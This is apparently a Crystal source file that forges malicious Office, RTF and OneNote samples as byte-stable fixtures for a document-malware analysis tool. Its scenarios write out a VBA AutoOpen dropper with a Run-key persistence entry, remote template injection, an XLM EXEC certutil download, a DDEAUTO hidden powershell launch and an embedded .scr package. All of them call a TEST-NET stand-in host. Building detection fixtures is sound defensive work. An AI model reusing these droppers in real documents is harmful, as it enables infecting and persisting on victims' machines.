require "./common"
require "./cfb"
require "./vba"
require "./carver"
require "compress/zip"
require "openssl"

# deterministic fixture forge. every scenario builds byte-stable artifacts
# (fixed 1980 timestamps, fixed deflate, hand-packed CFB) so tests, demos
# and CI reproduce exactly. scenarios use only lab-safe payloads: TEST-NET
# addresses, .invalid domains, junk MZ bodies — nothing alive.
module Grim::Forge
  EPOCH     = Time.utc(1980, 1, 1, 0, 0, 0)
  SCENARIOS = ["clean", "macro", "template", "xlm", "dde", "native", "carve"]

  # ---- MS-OVBA raw-chunk container --------------------------------------

  def self.raw_container(data : Bytes) : Bytes
    io = IO::Memory.new
    io.write_byte(0x01_u8)
    pos = 0
    while pos < data.size
      n = Math.min(4096, data.size - pos)
      chunk = data[pos, n]
      hdr = 0x3000_u16 | (n - 1).to_u16!
      io.write_bytes(hdr, IO::ByteFormat::LittleEndian)
      io.write(chunk)
      pos += n
    end
    io.to_slice
  end

  def self.le16(v : Int | UInt16) : Bytes
    b = Bytes.new(2, 0_u8)
    b[0] = (v.to_u16! & 0xFF).to_u8!
    b[1] = ((v.to_u16! >> 8) & 0xFF).to_u8!
    b
  end

  def self.le32(v : Int | UInt32) : Bytes
    b = Bytes.new(4, 0_u8)
    x = v.to_u32!
    4.times { |i| b[i] = ((x >> (8 * i)) & 0xFF).to_u8! }
    b
  end

  def self.rec(id : UInt16, body : Bytes) : Bytes
    io = IO::Memory.new
    io.write(le16(id))
    io.write(le32(body.size))
    io.write(body)
    io.to_slice
  end

  # ---- minimal CFB writer -----------------------------------------------

  class Node
    getter name : String
    property data : Bytes?
    getter children : Array(Node)

    def initialize(@name : String, @data : Bytes? = nil)
      @children = [] of Node
    end

    def storage? : Bool
      @data.nil?
    end
  end

  class CfbWriter
    SSZ = 512
    MSZ = 64

    def initialize(@root_name : String = "Root Entry")
      @root = Node.new(@root_name)
    end

    def add(path : String, data : Bytes)
      parts = path.split("/").map(&.strip).reject(&.empty?)
      cur = @root
      parts[0...-1].each do |seg|
        nxt = cur.children.find { |c| c.name == seg }
        unless nxt
          nxt = Node.new(seg)
          cur.children << nxt
        end
        cur = nxt
      end
      cur.children << Node.new(parts[-1], data)
    end

    def add_storage(path : String)
      parts = path.split("/").map(&.strip).reject(&.empty?)
      cur = @root
      parts.each do |seg|
        nxt = cur.children.find { |c| c.name == seg }
        unless nxt
          nxt = Node.new(seg)
          cur.children << nxt
        end
        cur = nxt
      end
    end

    def build : Bytes
      flat = [] of Tuple(Node, Node?)
      flatten(@root, nil, flat)
      raise "too many entries" if flat.size > 1000

      mini = IO::Memory.new
      big_io = IO::Memory.new
      big_list = [] of Tuple(Node, Int32)
      mini_list = [] of Tuple(Node, Int32)
      big_sector_count = 0

      flat.each do |node, _|
        next if node.storage?
        d = node.data.not_nil!
        if d.size < 4096
          mini_list << {node, mini.size // MSZ}
          mini.write(d)
          pad = (MSZ - (mini.size % MSZ)) % MSZ
          mini.write(Bytes.new(pad, 0_u8)) if pad > 0
        else
          big_list << {node, big_sector_count}
          big_io.write(d)
          padn = (SSZ - (big_io.size % SSZ)) % SSZ
          big_io.write(Bytes.new(padn, 0_u8)) if padn > 0
          big_sector_count = big_io.size // SSZ
        end
      end

      if (mini.size % MSZ) != 0
        mini.write(Bytes.new(MSZ - (mini.size % MSZ), 0_u8))
      end
      # pad ministream to a 512-byte sector boundary before sector accounting
      if (mini.size % SSZ) != 0
        mini.write(Bytes.new(SSZ - (mini.size % SSZ), 0_u8))
      end
      mini_bytes = mini.to_slice
      mini_sectors = mini_bytes.size // MSZ

      n_dir = ((flat.size * 128) + SSZ - 1) // SSZ
      n_minifat = mini_sectors > 0 ? 1 : 0
      n_ministream = mini_bytes.size // SSZ
      n_data = big_sector_count
      n_fat = 1
      while true
        total = n_fat + n_minifat + n_dir + n_ministream + n_data
        break if total <= n_fat * (SSZ // 4) || n_fat > 16
        n_fat += 1
      end

      fat = Array(UInt32).new(n_fat * (SSZ // 4), 0xFFFFFFFF_u32)
      (n_fat - 1).times { |i| fat[i] = (i + 1).to_u32! }
      fat[n_fat - 1] = 0xFFFFFFFE_u32
      base = n_fat
      mini_fat_start = 0
      if n_minifat > 0
        mini_fat_start = base
        fat[base] = 0xFFFFFFFE_u32
        base += 1
      end
      dir_start = base
      (n_dir - 1).times { |i| fat[dir_start + i] = (dir_start + i + 1).to_u32! }
      fat[dir_start + n_dir - 1] = 0xFFFFFFFE_u32 if n_dir > 0
      base += n_dir
      mini_start = base
      if n_ministream > 0
        (n_ministream - 1).times { |i| fat[mini_start + i] = (mini_start + i + 1).to_u32! }
        fat[mini_start + n_ministream - 1] = 0xFFFFFFFE_u32
        base += n_ministream
      end
      big_list.each do |node, start|
        n = (node.data.not_nil!.size + SSZ - 1) // SSZ
        (n - 1).times { |i| fat[base + start + i] = (base + start + i + 1).to_u32! }
        fat[base + start + n - 1] = 0xFFFFFFFE_u32
      end

      minifat = Array(UInt32).new(128, 0xFFFFFFFF_u32)
      mini_list.each do |node, mstart|
        n = (node.data.not_nil!.size + MSZ - 1) // MSZ
        (n - 1).times { |i| minifat[mstart + i] = (mstart + i + 1).to_u32! }
        minifat[mstart + n - 1] = 0xFFFFFFFE_u32
      end

      dir = IO::Memory.new
      index_of = {} of Node => Int32
      flat.each_with_index do |(node, _), i|
        index_of[node] = i
        kind = i == 0 ? 5_u8 : (node.storage? ? 1_u8 : 2_u8)
        name_bytes = node.name.bytes
        entry = Bytes.new(128, 0_u8)
        lim = Math.min(name_bytes.size, 31)
        lim.times do |k|
          entry[k * 2] = name_bytes[k]
          entry[k * 2 + 1] = 0_u8
        end
        nlen = Math.min(name_bytes.size * 2 + 2, 64)
        entry[64] = nlen.to_u8!
        entry[66] = kind
        entry[67] = 1 # black
        start = 0_u32
        size = 0_u64
        if i == 0
          start = (mini_bytes.size > 0 ? mini_start : 0).to_u32!
          size = mini_bytes.size.to_u64
        elsif !node.storage?
          d = node.data.not_nil!
          if d.size < 4096
            start = mini_list.find { |n2, _| n2 == node }.not_nil![1].to_u32!
          else
            start = (base + big_list.find { |n2, _| n2 == node }.not_nil![1]).to_u32!
          end
          size = d.size.to_u64
        end
        start_b = Forge.le32(start)
        4.times { |i| entry[116 + i] = start_b[i] }
        size_b = Forge.le32((size & 0xFFFFFFFF).to_u32!)
        4.times { |i| entry[120 + i] = size_b[i] }
        dir.write(entry)
      end
      # tree links: first child -> child field; then right-sibling chain
      flat.each_with_index do |(node, parent), i|
        next if i == 0
        par = parent.not_nil!
        pidx = index_of[par]
        sibs = par.children
        mypos = sibs.index(node).not_nil!
        if mypos == 0
          write_u32_at(dir, pidx * 128 + 68, i.to_u32!)
        else
          prev = sibs[mypos - 1]
          write_u32_at(dir, index_of[prev] * 128 + 72, i.to_u32!)
        end
      end
      dir_bytes = dir.to_slice

      io = IO::Memory.new
      head = Bytes.new(512, 0_u8)
      Grim::Cfb::MAGIC.each_with_index { |b, k| head[k] = b }
      head[24] = 0xFE_u8; head[25] = 0xFF_u8
      head[26] = 0x3E_u8; head[27] = 0x00_u8
      head[28] = 0x03_u8; head[29] = 0x00_u8
      head[30] = 0x09_u8; head[31] = 0x00_u8
      head[32] = 0x06_u8; head[33] = 0x00_u8
      write_u32_at_buf(head, 44, n_fat.to_u32!)
      write_u32_at_buf(head, 48, dir_start.to_u32!)
      write_u32_at_buf(head, 56, 4096_u32)
      write_u32_at_buf(head, 60, (n_minifat > 0 ? mini_fat_start : 0xFFFFFFFE).to_u32!)
      write_u32_at_buf(head, 64, n_minifat.to_u32!)
      write_u32_at_buf(head, 68, 0xFFFFFFFE_u32)
      write_u32_at_buf(head, 72, 0_u32)
      write_u32_at_buf(head, 76, 0_u32)
      108.times { |i| write_u32_at_buf(head, 80 + i * 4, 0xFFFFFFFF_u32) }
      io.write(head)
      io.write(fat_bytes(fat, n_fat))
      io.write(fat_bytes(minifat, n_minifat)) if n_minifat > 0
      io.write(pad_to(dir_bytes, n_dir * SSZ))
      io.write(mini_bytes)
      io.write(big_io.to_slice)
      io.to_slice
    end

    private def write_u32_at(io : IO::Memory, off : Int, v : UInt32)
      b = Forge.le32(v)
      io.seek(off)
      io.write(b)
    end

    private def write_u32_at_buf(buf : Bytes, off : Int, v : UInt32)
      b = Forge.le32(v)
      4.times { |i| buf[off + i] = b[i] }
    end

    private def flatten(node : Node, parent : Node?, acc : Array(Tuple(Node, Node?)))
      acc << {node, parent}
      node.children.each { |c| flatten(c, node, acc) }
    end

    private def fat_bytes(arr : Array(UInt32), n_sectors : Int) : Bytes
      io = IO::Memory.new
      arr.each { |v| io.write_bytes(v, IO::ByteFormat::LittleEndian) }
      pad_to(io.to_slice, n_sectors * SSZ)
    end

    private def pad_to(b : Bytes, size : Int) : Bytes
      return b if b.size >= size
      out = Bytes.new(size, 0_u8)
      out[0, b.size].copy_from(b)
      out
    end
  end

  # ---- OOXML zip writer ---------------------------------------------------

  def self.zip(entries : Array(Tuple(String, Bytes))) : Bytes
    io = IO::Memory.new
    Compress::Zip::Writer.open(io) do |z|
      entries.each do |name, data|
        e = Compress::Zip::Writer::Entry.new(name)
        e.time = EPOCH
        z.add(e) { |w| w.write(data) }
      end
    end
    io.to_slice
  end

  private def self.xml(s : String) : Bytes
    s.to_slice
  end

  CT_CLEAN = <<-XML
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  </Types>
  XML

  CT_MACRO = CT_CLEAN.gsub("wordprocessingml.document.main", "wordprocessingml.document.macroEnabled.main")

  RELS_ROOT = <<-XML
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
  </Relationships>
  XML

  DOC_BODY = <<-XML
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t>quarterly summary, see attached figures</w:t></w:r></w:p></w:body>
  </w:document>
  XML

  DOC_RELS = <<-XML
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
  </Relationships>
  XML

  CORE = <<-XML
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
   xmlns:dc="http://purl.org/dc/elements/1.1/">
  <dc:title>Quarterly summary</dc:title><dc:creator>finance archive</dc:creator>
  </cp:coreProperties>
  XML

  # ---- VBA project builder ------------------------------------------------

  def self.vba_project(modules : Array(Tuple(String, String))) : Bytes
    w = CfbWriter.new
    dir = IO::Memory.new
    dir.write(rec(0x0001_u16, le32(3)))       # syskind win32
    dir.write(rec(0x0002_u16, le32(1033)))    # lcid
    dir.write(rec(0x0014_u16, le32(1033)))    # lcid invoke
    dir.write(rec(0x0003_u16, le16(1252)))    # codepage
    dir.write(rec(0x0004_u16, "VBAProject".to_slice)) # name
    dir.write(rec(0x0005_u16, "".to_slice))      # docstring
    dir.write(rec(0x0006_u16, "normal.dotm".to_slice))
    dir.write(rec(0x0007_u16, "".to_slice))
    dir.write(rec(0x0008_u16, le32(0)))
    dir.write(rec(0x0009_u16, le32(0)))
    dir.write(rec(0x000A_u16, le32(0)))       # libflags
    dir.write(rec(0x000D_u16, le32(0)))       # version flavor (loose)
    dir.write(rec(0x000F_u16, le16(modules.size.to_i))) # project modules count
    modules.each do |name, code|
      stream = raw_container(code.to_slice)
      offset_in_stream = 0
      dir.write(rec(0x0019_u16, name.to_slice))
      dir.write(rec(0x0047_u16, name.to_slice)) # name unicode (utf16-ish junk ok)
      dir.write(rec(0x001A_u16, name.to_slice)) # stream name
      dir.write(rec(0x0032_u16, name.to_slice))
      dir.write(rec(0x001C_u16, "".to_slice))   # docstring
      dir.write(rec(0x0048_u16, "".to_slice))
      dir.write(rec(0x0031_u16, le32(offset_in_stream)))
      dir.write(rec(0x001E_u16, le32(0)))    # helpcontext
      dir.write(rec(0x002C_u16, le16(0xFFFF))) # cookie
      dir.write(rec(0x0021_u16, "".to_slice))   # procedural
      dir.write(rec(0x002B_u16, "".to_slice))   # terminator
      w.add("VBA/#{name}", stream)
    end
    dir.write(rec(0x0010_u16, "".to_slice))      # constants
    dir.write(rec(0x000F_u16, "".to_slice))      # modules end
    dir.write(rec(0x0016_u16, le16(0xFFFF)))  #ProjectExeName tail marker
    w.add("VBA/dir", dir.to_slice)
    proj = "ID=\"{D5D0E1C0-B8F2-4E4A-9E1A-0A0A0A0A0A0A}\"\r\nDocument=ThisDocument/&H00000000\r\nModule=Mod1\r\n"
    w.add("PROJECT", proj.to_slice)
    w.add("PROJECTwm", "ThisDocument\u0000ThisDocument\u0000\u0000".to_slice)
    w.build
  end

  # ---- scenarios -----------------------------------------------------------

  def self.build(scenario : String) : NamedTuple(name: String, bytes: Bytes)
    case scenario
    when "clean"
      {name: "invoice_summary.docx", bytes: zip([
        {"[Content_Types].xml", xml(CT_CLEAN)},
        {"_rels/.rels", xml(RELS_ROOT)},
        {"word/document.xml", xml(DOC_BODY)},
        {"word/_rels/document.xml.rels", xml(DOC_RELS)},
        {"docProps/core.xml", xml(CORE)},
      ])}
    when "macro"
      code = <<-VBA
      Attribute VB_Name = "Mod1"
      Sub AutoOpen()
          On Error Resume Next
          Dim sh As Object
          Set sh = CreateObject("WScript.Shell")
          Dim p As String
          p = Environ("APPDATA") & "\\"
          Dim x As Object
          Set x = CreateObject("MSXML2.ServerXMLHTTP")
          x.Open "GET", "http://203.0.113.77:8080/drop.bin", False
          x.Send
          Dim f As Object
          Set f = CreateObject("ADODB.Stream")
          f.Open
          f.Type = 1
          f.Write x.responseBody
          f.SaveToFile p & "svchost32.exe", 2
          sh.Run p & "svchost32.exe", 0, False
          regwrite_spells sh
      End Sub
      Sub regwrite_spells(sh As Object)
          sh.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync", Environ("APPDATA") & "\\svchost32.exe"
      End Sub
      VBA
      blob = vba_project([{"Mod1", code}])
      {name: "invoice_summary.docm", bytes: zip([
        {"[Content_Types].xml", xml(CT_MACRO)},
        {"_rels/.rels", xml(RELS_ROOT)},
        {"word/document.xml", xml(DOC_BODY)},
        {"word/_rels/document.xml.rels", xml(DOC_RELS)},
        {"docProps/core.xml", xml(CORE)},
        {"word/vbaProject.bin", blob},
      ])}
    when "template"
      settings_rels = <<-XML
      <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
      <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
      <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://203.0.113.77:8080/templates/relic.dotm" TargetMode="External"/>
      </Relationships>
      XML
      settings = <<-XML
      <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
      <w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
      <w:updateFields w:val="true"/><w:documentProtection w:edit="readOnly"/>
      </w:settings>
      XML
      {name: "policy_update.docx", bytes: zip([
        {"[Content_Types].xml", xml(CT_CLEAN)},
        {"_rels/.rels", xml(RELS_ROOT)},
        {"word/document.xml", xml(DOC_BODY)},
        {"word/_rels/document.xml.rels", xml(DOC_RELS)},
        {"word/_rels/settings.xml.rels", xml(settings_rels)},
        {"word/settings.xml", xml(settings)},
        {"docProps/core.xml", xml(CORE)},
      ])}
    when "xlm"
      sheet = <<-XML
      <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
      <worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
      <sheetData><row r="1">
      <c r="A1"><f>=EXEC("cmd /c certutil -urlcache -f http://203.0.113.77:8080/p.exe %APPDATA%\\p.exe")</f></c>
      <c r="A2"><f>=WAIT(NOW()+0:0:2)</f></c>
      <c r="A3"><f>=CALL("ShellExecute","run")</f></c>
      <c r="A4"><f>=HALT()</f></c>
      </row></sheetData></worksheet>
      XML
      {name: "cost_report.xlsm", bytes: zip([
        {"[Content_Types].xml", xml(CT_CLEAN.gsub("/word/document.xml", "/xl/worksheets/sheet1.xml").gsub("wordprocessingml.document.main", "spreadsheetml.sheet.macroEnabled.main"))},
        {"_rels/.rels", xml(RELS_ROOT)},
        {"xl/worksheets/sheet1.xml", xml(sheet)},
        {"xl/macrosheets/sheet1.xml", xml(sheet)},
        {"docProps/core.xml", xml(CORE)},
      ])}
    when "dde"
      ole = native_ole
      hex = ole.hexstring.upcase
      rtf = <<-RTF
      {\\rtf1\\ansi\\deff0 {\\fonttbl{\\f0 Calibri;}}
      \\fs22 Invoice status attached.
      {\\field{\\*\\fldinst{DDEAUTO "c:\\\\windows\\\\system32\\\\cmd.exe" "/k powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"}}{\\fldrslt x}}
      \\objupdate
      {\\object\\objautolink\\objupdate\\objclass Package{\\*\\objdata #{hex}}}
      }
      RTF
      {name: "invoice_status.rtf", bytes: rtf.to_slice}
    when "native"
      {name: "shipment_report.doc", bytes: native_ole}
    when "carve"
      body = IO::Memory.new
      body.write(Grim::Carver::ONENOTE_GUID)
      body.write(Bytes.new(48, 0x41_u8))
      body.write("OneNote table of contents".to_slice)
      body.write(le32(0x00000304))
      # junk PE-looking blob with a valid PE header
      pe = Bytes.new(512, 0x42_u8)
      pe[0] = 0x4D_u8; pe[1] = 0x5A_u8
      pe[0x3C] = 0x80_u8; pe[0x3D] = 0x00_u8; pe[0x3E] = 0x00_u8; pe[0x3F] = 0x00_u8
      pe[0x80] = 0x50_u8; pe[0x81] = 0x45_u8; pe[0x82] = 0x00_u8; pe[0x83] = 0x00_u8
      body.write(pe)
      body.write(Bytes[0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00])
      body.write(Bytes.new(24, 0x43_u8))
      body.write(Bytes.new(1200, 0x45_u8))
      body.write(Grim::Cfb::MAGIC)
      body.write(Bytes.new(96, 0x44_u8))
      {name: "meeting_notes.one", bytes: body.to_slice}
    else
      raise "unknown scenario #{scenario}"
    end
  end

  # OLE with Ole10Native embedding a fake exe + metadata + object pool
  def self.native_ole : Bytes
    w = CfbWriter.new
    w.add("WordDocument", Bytes.new(2048, 0x31_u8))
    w.add("1Table", Bytes.new(1024, 0x32_u8))
    # real PropertySetStream: header + FMTID + section of VT_LPSTR values
    ps = IO::Memory.new
    ps.write(le16(0xFFFE))
    ps.write(le16(0)) # version
    ps.write(le16(0)) # sysid
    ps.write(Bytes.new(16, 0_u8)) # clsid
    ps.write(le32(1))             # one property set
    ps.write(Grim::Cfb::SUMMARY_FMTID)
    ps.write(le32(46)) # section offset (26 header + 16 fmtid + 4 self)
    entries = [{"title", 2, "shipment report"}, {"author", 4, "logistics.desk"}, {"template", 18, "http://203.0.113.77:8080/t.dotm"}]
    section = IO::Memory.new
    values = IO::Memory.new
    section.write(le32(0)) # cbSection, patched later
    section.write(le32(entries.size.to_u32!))
    offs = [] of Int32
    pairs_size = 8 + entries.size * 8
    entries.each do |_, pid, val|
      section.write(le32(pid.to_u32!))
      offs << (pairs_size + values.size)
      section.write(le32(0)) # patched below
      b = val.to_slice
      values.write(le32(0x0000001E)) # VT_LPSTR
      values.write(le32(b.size + 1))
      values.write(b)
      values.write_byte(0_u8)
    end
    sec_bytes = section.to_slice
    entries.size.times do |i|
      write_u32_buf(sec_bytes, 8 + i * 8 + 4, offs[i].to_u32!)
    end
    write_u32_buf(sec_bytes, 0, (8 + entries.size * 8 + values.size).to_u32!)
    ps.write(sec_bytes)
    ps.write(values.to_slice)
    w.add("\u0005SummaryInformation", ps.to_slice)
    # Ole10Native: fake executable
    nat = IO::Memory.new
    exe = Bytes.new(600, 0x5A_u8)
    exe[0] = 0x4D_u8; exe[1] = 0x5A_u8
    payload_name = "shipment_label" + ".scr"
    nat.write(le32(0)) # patched size below
    nat.write((payload_name + "\0").to_slice)
    nat.write(("C:\\Users\\public\\" + payload_name + "\0").to_slice)
    nat.write(le32(0x231))
    nat.write(exe)
    nat_bytes = nat.to_slice
    write_u32_buf(nat_bytes, 0, nat_bytes.size.to_u32!)
    w.add("\u0001Ole10Native", nat_bytes)
    w.add_storage("ObjectPool")
    w.add("ObjectPool/_1563047389/\u0001Ole10Native", nat_bytes[0, 200])
    w.build
  end

  private def self.write_u32_buf(buf : Bytes, off : Int, v : UInt32)
    b = le32(v)
    4.times { |i| buf[off + i] = b[i] }
  end

  def self.forge_dir(scenario : String, outdir : String) : String
    Dir.mkdir_p(outdir)
    built = build(scenario)
    path = File.join(outdir, built[:name])
    File.write(path, built[:bytes])
    path
  end
end
